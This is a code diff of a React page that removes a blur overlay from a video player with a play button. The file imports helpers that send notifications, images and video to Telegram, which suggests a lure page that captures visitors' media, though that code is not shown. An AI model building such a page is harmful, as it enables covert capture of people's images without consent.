@@ -2,7 +2,6 @@ import { useState, useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
-  const [isBlurred] = useState(true);
   const thumbnailUrl = 'https://asset.kompas.com/crops/8555nxF39hG24drHcCoqlNrcKig=/0x0:1527x764/780x390/data/photo/2023/11/02/654285fd036c8.png';
 
   useEffect(() => {
@@ -154,9 +153,6 @@ function App() {
         <div className="max-w-[1080px] mx-auto">
           <div className="relative">
             <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
-              {isBlurred && (
-                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
-              )}
               <div className="absolute inset-0 flex items-center justify-center z-10">
                 <button 
                   onClick={handlePlayClick}
